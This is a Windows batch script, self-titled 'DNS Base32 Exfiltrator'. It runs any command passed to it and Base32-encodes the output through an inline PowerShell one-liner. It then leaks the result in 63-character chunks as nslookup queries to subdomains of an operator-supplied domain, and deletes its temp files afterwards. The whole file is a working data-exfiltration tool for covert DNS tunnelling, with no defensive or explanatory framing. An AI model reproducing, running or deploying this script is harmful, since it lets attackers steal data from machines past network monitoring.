@echo off
setlocal EnableDelayedExpansion

:: =========================================================
:: DNS Base32 Exfiltrator (Uppercase RFC 4648)
:: =========================================================

if "%~1" == "" goto :usage
if "%~2" == "" goto :usage

set "DNS_SERVER=%~1"
set "CMD=%~2"

set "TMP_OUT=%TEMP%\dns_exfil_out.txt"
set "TMP_B32=%TEMP%\dns_exfil_b32.txt"

:: ---------------------------------------------------------
:: Execute command and capture output
:: ---------------------------------------------------------
cmd /c "%CMD%" > "%TMP_OUT%" 2>&1

if not exist "%TMP_OUT%" (
    echo Failed to capture command output.
    exit /b 1
)

:: ---------------------------------------------------------
:: Base32 encode (Uppercase Alphabet)
:: ---------------------------------------------------------
powershell -NoProfile -Command "$b=[System.IO.File]::ReadAllBytes('%TMP_OUT%'); $a='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'; $sb=New-Object System.Text.StringBuilder; $v=0; $l=0; foreach($x in $b){ $v=($v -shl 8) -bor $x; $l+=8; while($l -ge 5){ [void]$sb.Append($a[($v -shr ($l-5)) -band 31]); $l-=5 } }; if($l -gt 0){ [void]$sb.Append($a[($v -shl (5-$l)) -band 31]) }; $sb.ToString() | Out-File -FilePath '%TMP_B32%' -Encoding ascii -NoNewline"

if not exist "%TMP_B32%" (
    echo Base32 encoding failed.
    exit /b 1
)

:: ---------------------------------------------------------
:: Send payload in DNS-safe chunks (63 chars)
:: ---------------------------------------------------------
for /f "usebackq delims=" %%A in ("%TMP_B32%") do (
    set "PAYLOAD=%%A"
    call :process_chunks
)

del /f /q "%TMP_OUT%" >nul 2>&1
del /f /q "%TMP_B32%" >nul 2>&1
goto :done

:process_chunks
set "OFFSET=0"
:send_loop
:: Extract 63 characters
set "CHUNK=!PAYLOAD:~%OFFSET%,63!"
if "!CHUNK!"=="" goto :eof

:: DNS is case-insensitive, but we send the string as-is (Uppercase)
echo Sending: !CHUNK!.%DNS_SERVER%
nslookup -type=A "!CHUNK!.%DNS_SERVER%" >nul 2>&1

:: Delay to prevent packet loss
timeout /t 1 /nobreak >nul

set /a OFFSET+=63
goto :send_loop

:done
echo Finished.
exit /b 0

:usage
echo Usage: %~nx0 ^<dns-server^> "^<command^>"
exit /b 1
